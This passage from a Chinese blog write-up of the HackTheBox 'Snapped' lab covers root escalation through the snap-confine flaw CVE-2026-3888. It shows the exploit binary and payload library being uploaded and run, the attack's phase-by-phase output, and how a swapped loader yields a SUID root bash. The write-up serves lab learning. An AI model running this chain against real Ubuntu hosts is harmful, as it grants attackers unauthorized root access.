+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ snap list</span><br><span class="line">Name                       Version          Rev    Tracking         Publisher   Notes</span><br><span class="line">bare                       1.0              5      latest/stable    canonical✓  base</span><br><span class="line">core22                     20240731         1564   latest/stable    canonical✓  base</span><br><span class="line">firefox                    129.0.2-1        4793   latest/stable/…  mozilla✓    -</span><br><span class="line">firmware-updater           0+git.5007558    127    1/stable/…       canonical✓  -</span><br><span class="line">gnome-42-2204              0+git.510a601    176    latest/stable/…  canonical✓  -</span><br><span class="line">gtk-common-themes          0.1-81-g442e511  1535   latest/stable/…  canonical✓  -</span><br><span class="line">snap-store                 0+git.e3dd562    1173   2/stable/…       canonical✓  -</span><br><span class="line">snapd                      2.63             21759  latest/stable    canonical✓  snapd</span><br><span class="line">snapd-desktop-integration  0.9              178    latest/stable/…  canonical✓  -</span><br></pre></td></tr></table></figure>
+
+<p>存在 firefox 和 snap-store。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ systemctl is-active systemd-tmpfiles-clean.timer</span><br><span class="line">active</span><br></pre></td></tr></table></figure>
+
+<p>确认 <code>systemd-tmpfiles-clean.timer</code> 已经启用。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ <span class="built_in">which</span> busybox</span><br><span class="line">/usr/bin/busybox</span><br></pre></td></tr></table></figure>
+
+<p><code>busybox</code> 也存在目标系统上可用。</p>
+<p>然后根据描述：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429213230575.png" alt="file-20260429213230575"></p>
+<p>进行编译文件。</p>
+<blockquote>
+<p><code>exploit</code> 对应的是 CVE 利用的自动化流程，<code>librootshell.so</code> 就是用于替换的 shellcode</p>
+</blockquote>
+<p>将编译得到的结果上传到目标服务器上：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@htb:~# scp exploit jonathan@10.129.45.91:/tmp/</span><br><span class="line">jonathan@10.129.45.91<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">exploit                                                                                                                      100%  827KB   1.3MB/s   00:00    </span></span><br><span class="line"><span class="string">root@htb:~# scp librootshell.so jonathan@10.129.45.91:/tmp/</span></span><br><span class="line"><span class="string">jonathan@10.129.45.91&#x27;</span>s password: </span><br><span class="line">librootshell.so                                                                                                              100% 9056    63.1KB/s   00:00    </span><br></pre></td></tr></table></figure>
+
+<p>重更登入 jonathan 的账号，并进入 <code>/tmp</code> 目录确认我们上传的文件存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:~$ cd /tmp</span><br><span class="line">jonathan@snapped:/tmp$ ls</span><br><span class="line">dbus-HpDMk1e5Dz</span><br><span class="line">exploit</span><br><span class="line">librootshell.so</span><br><span class="line">nginx-ui-search-index-2039889097</span><br><span class="line">nginx-ui.sock</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-colord.service-B2FuuE</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-fwupd.service-FrAufP</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-ModemManager.service-y0GD7S</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-polkit.service-WmBLmq</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-power-profiles-daemon.service-mOCsYi</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-switcheroo-control.service-hrD0Wa</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-systemd-logind.service-UY6kNV</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-systemd-oomd.service-7GblbQ</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-systemd-resolved.service-bRUFuw</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-systemd-timesyncd.service-DnQ6jL</span><br><span class="line">systemd-private-1cbfbf2facfa4178a39e4b874a93b6df-upower.service-GI7bmc</span><br><span class="line">VMwareDnD</span><br><span class="line">jonathan@snapped:/tmp$ </span><br></pre></td></tr></table></figure>
+
+<p>按照仓库描述：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429213630737.png" alt="file-20260429213630737"></p>
+<p>没有 root 权限的情况下，直接运行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./exploit ./librootshell.so</span><br></pre></td></tr></table></figure>
+
+<p>但是这有个坑，我们按照这个命令运行的话，看输出日志：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260429213803090.png" alt="file-20260429213803090"></p>
+<p><code>librootshell.so</code> 的路径中多进去一个 <code>./</code>，这回导致第五阶段的利用失败，因此正确的用法是直接：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./exploit librootshell.so</span><br></pre></td></tr></table></figure>
+
+<p>运行 Poc：</p>
+<blockquote>
+<p>注意：这个 Poc 可能需要多次尝试才能成功。</p>
+</blockquote>
+<p>第一阶段，进入沙箱，并获得沙箱的 PID号：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jonathan@snapped:/tmp$ ./exploit librootshell.so</span><br><span class="line">================================================================</span><br><span class="line">    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE</span><br><span class="line">================================================================</span><br><span class="line">[*] Payload: /tmp/librootshell.so (9056 bytes)</span><br><span class="line"></span><br><span class="line">[Phase 1] Entering Firefox sandbox...</span><br><span class="line">[+] Inner shell PID: 22036</span><br></pre></td></tr></table></figure>
+
+<p>第二阶段：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Phase 2] Waiting <span class="keyword">for</span> .snap deletion...</span><br><span class="line">[*] Polling (up to 30 days on stock Ubuntu).</span><br><span class="line">[*] Hint: use -s to skip.</span><br></pre></td></tr></table></figure>
+
+<p>等待 <code>systemd-tmpfiles</code> 删除 <code>.snap</code> 目录。</p>
+<blockquote>
+<p>不要被上面的“等待30天”的提示吓到，我们之前确认过，靶机为了方便我们复现，设置成了 4 分钟清理一次。</p>
+</blockquote>
+<p>第三阶段：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Phase 3] Destroying cached mount namespace...</span><br><span class="line">cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_jRogxP//dev: No such file or directory</span><br><span class="line">[+] Namespace destroyed.</span><br></pre></td></tr></table></figure>
+
+<p>会销毁缓存的挂载命名空间（动机：<code>snap-confine</code> 会缓存挂载命名空间，以便在后续启动 snap 时无需重建即可重复使用，如果旧的缓存命名空间仍然存在，<code>snap-confine</code> 将会复用它，并且永远不会从 <code>/tmp/.snap</code> 读取任何内容，这意味着攻击者的恶意目录将被忽略），通过诱发错误，确保下次启动 Snap 时必须从头构建一个全新的命名空间，此时它就会获取攻击者的内容。</p>
+<p>第四阶段，竞态条件，写入 <code>.snap</code> 目录并替换动态链接器为 shellcode：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Phase 4] Setting up and running the race...</span><br><span class="line">[*]   Working directory: /proc/22036/cwd</span><br><span class="line">[*]   Building .snap and .exchange...</span><br><span class="line">[*]   285 entries copied to exchange directory</span><br><span class="line">[*]   Starting race...</span><br><span class="line">[*]   Monitoring snap-confine (child PID 22366)...</span><br><span class="line"></span><br><span class="line">[!]   TRIGGER ? swapping directories...</span><br><span class="line">[+]   SWAP DONE ? race won!</span><br><span class="line">[*]   ld-linux <span class="keyword">in</span> namespace: jonathan:jonathan 755</span><br><span class="line">[+]   Poisoned namespace PID: 22366</span><br></pre></td></tr></table></figure>
+
+<p>后续的几个阶段完成了 shellcode 的执行并进行沙箱逃逸最终获得宿主机的 root shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Phase 5] Injecting payload into poisoned namespace...</span><br><span class="line">[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.</span><br><span class="line">[*]   Planting busybox...</span><br><span class="line">[*]   Writing escape script → /tmp/sh</span><br><span class="line">[*]   Overwriting ld-linux-x86-64.so.2...</span><br><span class="line">[+]   Payload injected.</span><br><span class="line"></span><br><span class="line">[Phase 6] Triggering root via SUID snap-confine...</span><br><span class="line">[*]   snap-confine → snap-confine (SUID trigger)</span><br><span class="line">[*]   Exit status: 0</span><br><span class="line"></span><br><span class="line">[Phase 7] Verifying...</span><br><span class="line">[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)</span><br><span class="line">[*] Cleaning up background processes...</span><br></pre></td></tr></table></figure>
+
+<p>简单来讲，<code>snap-confine</code>（SetUID root）将加载伪造的动态加载器即 <code>librootshell.so</code>，该文件会调用 <code>setreuid(0,0)</code> 以及 <code>execve(&quot;/tmp/sh&quot;)</code>。 <code>/tmp/sh</code> 脚本使用 <code>busybox</code> 将 <code>/bin/bash</code> 复制到 <code>/var/snap/firefox/common/bash</code> 并为其设置 SetUID root 权限，之所以选择该路径是因为它可在 snap 命名空间内部写入而且主机也能访问，因此命名空间退出后，SUID bash 仍会保留。</p>
+<blockquote>
+<p>这一部分 0xdf 大佬讲得非常好（他分了两个终端来查看文件创建、替换的过程），大家可以去看看他对本题的题解（<code>https://0xdf.gitlab.io/2026/04/01/htb-snapped.html</code>）。</p>
+</blockquote>
+<p>Poc 运行完毕之后，我们就直接获得了 root shell，接着查看 root flag：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/file-20260430164617194.png" alt="file-20260430164617194"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io">谁把我灯关了</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io/2026/04/30/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">https://beini-faxianl.github.io/2026/04/30/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://beini-faxianl.github.io" target="_blank">A Secret Site</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HackTheBox/">HackTheBox</a><a class="post-meta__tags" href="/tags/SSH/">SSH</a><a class="post-meta__tags" href="/tags/Snapped/">Snapped</a><a class="post-meta__tags" href="/tags/HTB-Writeup/">HTB Writeup</a><a class="post-meta__tags" href="/tags/Nginx-UI/">Nginx UI</a><a class="post-meta__tags" href="/tags/CVE-2026-27944/">CVE-2026-27944</a><a class="post-meta__tags" href="/tags/CVE-2026-3888/">CVE-2026-3888</a><a class="post-meta__tags" href="/tags/Virtual-Host-Enumeration/">Virtual Host Enumeration</a><a class="post-meta__tags" href="/tags/Backup-Disclosure/">Backup Disclosure</a><a class="post-meta__tags" href="/tags/AES-CBC/">AES-CBC</a><a class="post-meta__tags" href="/tags/SQLite/">SQLite</a><a class="post-meta__tags" href="/tags/bcrypt/">bcrypt</a><a class="post-meta__tags" href="/tags/hashcat/">hashcat</a><a class="post-meta__tags" href="/tags/Snap/">Snap</a><a class="post-meta__tags" href="/tags/snap-confine/">snap-confine</a><a class="post-meta__tags" href="/tags/systemd-tmpfiles/">systemd-tmpfiles</a><a class="post-meta__tags" href="/tags/SUID/">SUID</a><a class="post-meta__tags" href="/tags/Linux-Privilege-Escalation/">Linux Privilege Escalation</a><a class="post-meta__tags" href="/tags/Ubuntu/">Ubuntu</a><a class="post-meta__tags" href="/tags/Web-Security/">Web Security</a><a class="post-meta__tags" href="/tags/Red-Team-Lab/">Red Team Lab</a></div><div class="post-share"><div class="social-share" data-image="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/cover_snapped.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/25/CVE-2023-1773-%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%8E%B0%EF%BC%9A%E4%BB%8E-REIM-%E5%9B%9E%E8%B0%83%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%B0%E4%BF%A1%E5%91%BC-OA-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" title="CVE-2023-1773 深度复现：从 REIM 回调未授权到信呼 OA 配置文件代码注入"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/CVE-2023-1773-%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%8E%B0%EF%BC%9A%E4%BB%8E-REIM-%E5%9B%9E%E8%B0%83%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%B0%E4%BF%A1%E5%91%BC-OA-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CVE-2023-1773 深度复现：从 REIM 回调未授权到信呼 OA 配置文件代码注入</div></div><div class="info-2"><div class="info-item-1">一、漏洞入口根据 CVE 官网（https://www.cve.org/CVERecord?id=CVE-2023-1773）的描述：  它将该漏洞归类为 RockOA 2.3.2 的 webmainConfig.php 相关代码注入漏洞，一些漏洞数据库基本都复用了该表述：    但经源码审计，漏洞根因更准确地说是配置保存逻辑未正确处理用户可控输入，导致可控内容写入 PHP 配置文件并在后续包含加载时触发代码注入。 真正的漏洞入口文件是 webmain\system\cog\cogAction.php，聚焦其中的 savecongAjax() 方法（截取了关键部分）： public function savecongAjax()	&#123;		if(getconfig(&#x27;systype&#x27;)==&#x27;demo&#x27;)exit(&#x27;演示上禁止设置&#x27;);		if($this-&gt;getsession(&#x27;isadmin&#x27;)!=&#x27;1&#x27;)exit(&#x27;非管理员不能操作&#x27;);			...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/04/23/HackTheBox-Cap-%E9%9D%B6%E6%9C%BA%EF%BC%9A%E4%BB%8E-IDOR-%E5%88%B0-PCAP-%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96%E5%86%8D%E5%88%B0-Capabilities-%E6%8F%90%E6%9D%83/" title="HackTheBox Cap 靶机：从 IDOR 到 PCAP 凭据提取再到 Capabilities 提权"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Cap-%E9%9D%B6%E6%9C%BA%EF%BC%9A%E4%BB%8E-IDOR-%E5%88%B0-PCAP-%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96%E5%86%8D%E5%88%B0-Capabilities-%E6%8F%90%E6%9D%83/cover.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-23</div><div class="info-item-2">HackTheBox Cap 靶机：从 IDOR 到 PCAP 凭据提取再到 Capabilities 提权</div></div><div class="info-2"><div class="info-item-1"> 一、题目信息 二、信息搜集TCP 全端口扫描 + 指纹识别 + 操作系统识别： sudo rustscan -a 10.129.35.25 -r 1-65535 -- -sV -O -Pn -n  输出（关键部分）： PORT   STATE SERVICE REASON         VERSION21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.322/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp open  http    syn-ack ttl 63 Gunicorn   目标 OS：Ubuntu 80 指纹：Gunicorn，这是 Python 的 WSGI HTTP 服务器，通常作为 Web 应用与反向代理（如 Nginx）之间的中间层运行（但是在本题中是直接作为后端服务器存在） 21 端口可以尝试 ftp 匿名登入  补一波 UDP 高价值（top 20）端口扫描 +...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">谁把我灯关了</div><div class="author-info-description">??????????</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">112</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/beini-faxianl"><i class="fab fa-github"></i><span>Visit GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/beini-faxianl" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/2301_76794844?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="https://www.cnblogs.com/youdiscovered1t" target="_blank" title="博客园"><i class="fa fa-pen-nib"></i></a><a class="social-icon" href="mailto:1436319009@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">CTF / Security / Notes / Life</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%9D%B6%E6%9C%BA%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">一、靶机的相关信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">二、信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81TCP-80"><span class="toc-number">3.</span> <span class="toc-text">三、TCP 80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Nginx-UI"><span class="toc-number">4.</span> <span class="toc-text">四、Nginx UI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81backup"><span class="toc-number">5.</span> <span class="toc-text">五、backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81CVE-2026-27944"><span class="toc-number">6.</span> <span class="toc-text">六、CVE-2026-27944</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%9F%A5%E7%9C%8B%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">7.</span> <span class="toc-text">七、查看压缩包中的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81nginx"><span class="toc-number">7.1.</span> <span class="toc-text">1、nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81nginx-ui"><span class="toc-number">7.2.</span> <span class="toc-text">2、nginx-ui</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81User-Flag"><span class="toc-number">8.</span> <span class="toc-text">八、User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81CVE-2026-3888"><span class="toc-number">9.</span> <span class="toc-text">九、CVE-2026-3888</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/30/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" title="HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/cover_snapped.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权"/></a><div class="content"><a class="title" href="/2026/04/30/HackTheBox-Snapped-WP%EF%BC%9A%E4%BB%8E-Nginx-UI-%E5%A4%87%E4%BB%BD%E6%B3%84%E9%9C%B2%E5%88%B0-snap-confine-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/" title="HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权">HackTheBox Snapped WP：从 Nginx UI 备份泄露到 snap-confine 本地提权</a><time datetime="2026-04-30T09:00:00.000Z" title="发表于 2026-04-30 17:00:00">2026-04-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/25/CVE-2023-1773-%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%8E%B0%EF%BC%9A%E4%BB%8E-REIM-%E5%9B%9E%E8%B0%83%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%B0%E4%BF%A1%E5%91%BC-OA-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" title="CVE-2023-1773 深度复现：从 REIM 回调未授权到信呼 OA 配置文件代码注入"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/CVE-2023-1773-%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%8E%B0%EF%BC%9A%E4%BB%8E-REIM-%E5%9B%9E%E8%B0%83%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%B0%E4%BF%A1%E5%91%BC-OA-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2023-1773 深度复现：从 REIM 回调未授权到信呼 OA 配置文件代码注入"/></a><div class="content"><a class="title" href="/2026/04/25/CVE-2023-1773-%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%8E%B0%EF%BC%9A%E4%BB%8E-REIM-%E5%9B%9E%E8%B0%83%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%B0%E4%BF%A1%E5%91%BC-OA-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" title="CVE-2023-1773 深度复现：从 REIM 回调未授权到信呼 OA 配置文件代码注入">CVE-2023-1773 深度复现：从 REIM 回调未授权到信呼 OA 配置文件代码注入</a><time datetime="2026-04-25T09:00:00.000Z" title="发表于 2026-04-25 17:00:00">2026-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/23/HackTheBox-Cap-%E9%9D%B6%E6%9C%BA%EF%BC%9A%E4%BB%8E-IDOR-%E5%88%B0-PCAP-%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96%E5%86%8D%E5%88%B0-Capabilities-%E6%8F%90%E6%9D%83/" title="HackTheBox Cap 靶机：从 IDOR 到 PCAP 凭据提取再到 Capabilities 提权"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/HackTheBox-Cap-%E9%9D%B6%E6%9C%BA%EF%BC%9A%E4%BB%8E-IDOR-%E5%88%B0-PCAP-%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96%E5%86%8D%E5%88%B0-Capabilities-%E6%8F%90%E6%9D%83/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackTheBox Cap 靶机：从 IDOR 到 PCAP 凭据提取再到 Capabilities 提权"/></a><div class="content"><a class="title" href="/2026/04/23/HackTheBox-Cap-%E9%9D%B6%E6%9C%BA%EF%BC%9A%E4%BB%8E-IDOR-%E5%88%B0-PCAP-%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96%E5%86%8D%E5%88%B0-Capabilities-%E6%8F%90%E6%9D%83/" title="HackTheBox Cap 靶机：从 IDOR 到 PCAP 凭据提取再到 Capabilities 提权">HackTheBox Cap 靶机：从 IDOR 到 PCAP 凭据提取再到 Capabilities 提权</a><time datetime="2026-04-23T03:00:00.000Z" title="发表于 2026-04-23 11:00:00">2026-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/15/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-%C2%B7-SecretVault-WP%EF%BC%9AHTTP-Connection-%E5%A4%B4%E7%BB%95%E8%BF%87-JWT-%E5%8F%8D%E4%BB%A3%E8%BA%AB%E4%BB%BD%E6%A0%A1%E9%AA%8C/" title="第九届强网杯 · SecretVault WP：HTTP Connection 头绕过 JWT 反代身份校验"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-%C2%B7-SecretVault-WP%EF%BC%9AHTTP-Connection-%E5%A4%B4%E7%BB%95%E8%BF%87-JWT-%E5%8F%8D%E4%BB%A3%E8%BA%AB%E4%BB%BD%E6%A0%A1%E9%AA%8C/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第九届强网杯 · SecretVault WP：HTTP Connection 头绕过 JWT 反代身份校验"/></a><div class="content"><a class="title" href="/2026/04/15/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-%C2%B7-SecretVault-WP%EF%BC%9AHTTP-Connection-%E5%A4%B4%E7%BB%95%E8%BF%87-JWT-%E5%8F%8D%E4%BB%A3%E8%BA%AB%E4%BB%BD%E6%A0%A1%E9%AA%8C/" title="第九届强网杯 · SecretVault WP：HTTP Connection 头绕过 JWT 反代身份校验">第九届强网杯 · SecretVault WP：HTTP Connection 头绕过 JWT 反代身份校验</a><time datetime="2026-04-15T06:00:00.000Z" title="发表于 2026-04-15 14:00:00">2026-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" 